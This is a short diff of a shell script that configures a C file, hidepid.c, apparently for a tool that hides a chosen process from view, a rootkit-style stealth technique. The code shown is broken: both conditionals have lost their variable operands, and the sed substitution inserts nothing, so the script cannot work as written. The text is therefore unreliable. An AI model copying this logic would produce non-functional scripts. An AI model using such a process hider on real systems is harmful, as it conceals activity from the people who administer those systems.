@@ -13,7 +13,7 @@ if [ -z  ] ; then
     echo -en "\x21\x21\x21 No pid to hide\n" && usage
 fi
 
-cat template | sed "s/___HIDEPID___//g" > hidepid.c && hidepid=1
+cat hideme.c | sed "s/___HIDEPID___//g" > _ && mv _ hidepid.c && hidepid=1
 
 if [[  -eq 1 ]] ; then
     echo -en "\x2B\x2B\x2B Successfully configured hidepid.c\n"
